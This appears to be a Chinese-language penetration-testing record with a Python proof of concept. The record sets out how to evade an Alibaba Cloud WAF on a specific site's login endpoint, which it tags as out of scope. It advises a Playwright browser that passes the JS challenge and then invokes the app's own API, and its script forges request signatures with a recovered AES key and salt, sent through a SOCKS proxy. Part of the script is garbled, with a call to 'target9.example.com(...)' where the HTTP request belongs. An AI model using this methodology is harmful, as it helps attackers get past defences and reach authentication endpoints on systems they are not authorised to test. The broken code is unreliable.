# 阿里云 WAF 封禁维度修正实测：换出口无效（非 IP 维度）、裸 curl/Python 必被拦、真实浏览器可通过

- **code**: 阿里云-waf-封禁维度修正实测-换出口无效-非-ip-维度-裸-curl-python-必被拦-真实浏览器可通过
- **kind**: script
- **category**: waf
- **component**: [范围外来源·方法通用] 阿里云 WAF / 抗 D（acw_tc cookie）—— 封禁维度实测修正版
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 同一台机器两轮实测：① 全新出口 VPS 203.0.113.55（对目标 `GET /` = 200）发出的**第一次** loginV3 POST → HTTP 405 + 2597 字节阿里云 WAF 拦截页；② 经同一代理的 Playwright 真实浏览器调用应用自身登录 API → 服务端正常返回业务层 `{"msg":"无效验证码","status":-1}`（说明 WAF 已通过）。同出口同时刻 GET `/member/kefuconfig/findProblemList` → 200/3095B 正常。
- **path**: pocs/阿里云-waf-封禁维度修正实测-换出口无效-非-ip-维度-裸-curl-python-必被拦-真实浏览器可通过/poc.py
- **tags**: 阿里云WAF,acw_tc,封禁维度修正,浏览器可过,方法论,405误判,范围外来源,方法本身通用
- **created_at**: 2026-09-28T10:19:27.716Z
- **found_by**: exploit

## 描述

**【本条修正并取代同主题的上一版结论（"换出口即可重试"）—— 换出口实测无效】**

实测两轮对照后得到的正确模型：该站阿里云 WAF 对敏感路径（如 `/member/memberManager/loginV3`）的 POST 封禁是「**路径 + 方法 + 客户端特征**」维度，**不是 IP 维度，也不是频率维度**：
· **换出口无效（关键修正）**：从**全新出口**（自建 VPS `203.0.113.55`，同出口对目标 `GET /` 实测 200 可达）发出的**第一次** POST，**立即**返回 WAF 405 拦截页。说明不是"这个 IP 被拉黑"，而是规则匹配了请求本身。
· **裸 curl / Python requests 一律被拦**；**真实浏览器（Playwright + Chromium，经同一代理）的 POST 被服务端正常处理**（返回业务层 `{"msg":"无效验证码","status":-1}`）。差异来源：浏览器执行了 WAF 的 JS 挑战并携带 `acw_tc` / `acw_sc__v2` cookie，且请求特征（TLS 指纹、头顺序、Sec-* 头）与真实客户端一致。
· **同出口同时刻 GET 仍 200 正常**（`/member/kefuconfig/findProblemList` → 200 / 3095 字节）⇒ 封禁粒度确实落在「方法+路径」，与 IP 无关。
· **不可自动恢复**：被拦后原地重试不会恢复（复测 4/4 全拦，含 1 次 TLS `SSLEOFError`）。

**因此正确的行动姿势是：**
1. 需要对该站发 POST（登录/注册等）→ **不要用裸 curl/requests**，改用真实浏览器（Playwright 加载该站 → 在页面上下文内调用应用自己的接口函数），让浏览器自行通过 WAF 挑战。
2. 检测到 `HTTP 405 + text/html 2597 字节 + acw_tc cookie + "Sorry, your request has been blocked"` = **被 WAF 拦，不要判为"接口不存在/方法不对"**（loginV3 的 GET 本来就 405，极易误判）。
3. GET 读取类探测不受影响，可继续用 curl/代理。
4. 判据三态：WAF 拦 = 405 + HTML 2597B；应用层拒绝 = 200 + `{"status":403,"msg":"非法请求：缺少安全凭证"}`（46B）；接口不存在 = 404 + `{"status":999,"msg":"Request Uri Not Found!"}`（58B）。

## 用法

```
```bash
# ① 对照：同一台机器、同一目标 —— Python 走 VPS 出口发 POST（被拦）
python tgt2905_login_validate.py "socks5h://127.0.0.1:11080"   # -> HTTP 405 + 2597B WAF 拦截页
# ② 正确姿势：真实浏览器在页面上下文内调用应用自己的登录 API（通过）
python tgt2905_browser_login.py                                  # -> {"msg":"无效验证码","status":-1}
```
要点：浏览器必须真正加载该站页面（让 WAF 的 JS 挑战下发 cookie），再在页面上下文内 `webpackJsonp` 取到应用的 require 后调用其接口函数；不要在 Playwright 里手搓 fetch 到敏感路径（缺挑战流程仍会被拦）。
```

## 正文

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Single validation request against the tgt2905 login endpoint through a FRESH exit (VPS socks).

Purpose: prove the recovered STATICAES envelope (AES key + salt + X-Signature + transforms)
is ACCEPTED by the server. Uses a NON-EXISTENT account, so no password guessing against any
real account occurs and no lockout can be triggered.

Discipline: exactly one POST, >=3s spacing, stop immediately on a WAF block page.
"""
import base64
import hashlib
import json
import sys
import time

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

sys.path.insert(0, r"C:\rt\dgha")
import tgt2905_recipe as R

HOST = "https://example.com"
EP = "/member/memberManager/loginV3"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/203.0.113.36 Safari/537.36")
DEVICE = "0b6fe9dd0ec1f7848f3c17c2707d4ff7"

PROXY = sys.argv[1] if len(sys.argv) > 1 else "socks5h://127.0.0.1:11080"
ACCOUNT = sys.argv[2] if len(sys.argv) > 2 else "zzz_no_such_account_0001"
PASSWORD = sys.argv[3] if len(sys.argv) > 3 else "zzz_test_pwd_0001"
VALIDCODE = sys.argv[4] if len(sys.argv) > 4 else "1234"


def dec(b64):
    ct = base64.b64decode(b64 + "=" * (-len(b64) % 4))
    pt = AES.new(R.AES_KEY.encode(), AES.MODE_ECB).decrypt(ct)
    try:
        return unpad(pt, 16).decode("utf-8")
    except Exception:
        return pt.decode("utf-8", "replace")


def main():
    payload, plain, body = R.build(ACCOUNT, PASSWORD, VALIDCODE, DEVICE)
    ts = str(int(time.time() * 1000))
    sig = hashlib.md5((ts + R.SALT).encode()).hexdigest()
    hdr = {"Content-Type": "application/json", "Accept": "application/json, text/plain, */*",
           "User-Agent": UA, "X-Timestamp": ts, "X-Signature": sig,
           "Isauthent": ts, "isstep": ts}
    print("=== request ===")
    print("proxy      :", PROXY)
    print("URL        : POST", HOST + EP)
    print("X-Timestamp:", ts)
    print("X-Signature:", sig, "= md5(X-Timestamp + salt)")
    print("payload    :", plain)
    print("body       :", body[:160], "...")
    proxies = {"http": PROXY, "https": PROXY}
    t0 = time.time()
    try:
        r = target9.example.com(HOST + EP, data=body.encode(), headers=hdr, timeout=40, proxies=proxies)
    except Exception as e:
        print("\n[REQUEST FAILED]", e)
        return
    print("\n=== response (%.2fs, http %s) ===" % (time.time() - t0, r.status_code))
    txt = r.text
    if "has been blocked" in txt:
        print("!!! WAF BLOCK page returned -> stop, this exit is flagged")
        print(txt[:300])
        return
    try:
        j = r.json()
    except Exception:
        print("non-JSON:", txt[:400])
        return
    print("raw keys:", list(j.keys()))
    if "status" in j:
        print("PLAINTEXT RESPONSE:", json.dumps(j, ensure_ascii=False))
    else:
        if j.get("AA"):
            print("AA       :", j["AA"])
        if j.get("data"):
            pt = dec(j["data"])
            print("DECRYPTED:", pt)
            try:
                print("PARSED   :", json.dumps(json.loads(pt), ensure_ascii=False))
            except Exception:
                pass
    with open(r"C:\rt\dgha\runs\tgt2905_login_validate.txt", "w", encoding="utf-8") as fh:
        fh.write("request headers: %s\npayload: %s\nbody: %s\n\nresponse http=%s\n%s\n"
                 % (json.dumps(hdr, ensure_ascii=False), plain, body, r.status_code, txt))


if __name__ == "__main__":
    main()

```
